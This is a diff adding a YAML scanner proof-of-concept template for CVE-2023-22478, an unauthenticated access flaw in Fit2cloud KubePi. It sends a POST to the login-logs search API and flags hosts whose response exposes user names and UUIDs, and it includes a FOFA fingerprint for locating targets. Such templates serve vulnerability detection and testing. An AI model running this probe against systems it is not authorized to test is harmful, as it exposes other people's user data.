@@ -1,0 +1,26 @@
+id: poc-yaml-fit2cloud-kubepi-unauthorized-access
+info:
+  name: Fit2cloud Kubepi未授权访问(CVE-2023-22478)
+  severity: high
+  tags:
+  - CVE-2023-22478
+  - 未授权访问
+  finger: kubepi
+  fofa: kubepi
+requests:
+- method: POST
+  path: /kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10
+  headers:
+    Content-Type: application/json
+  data: '{}'
+  expression: 'status_code == 200
+
+    && contains(body,"apiVersion")
+
+    && contains(body,"uuid")
+
+    && contains(body,"userName")
+
+    '
+variables: {}
+transport: http
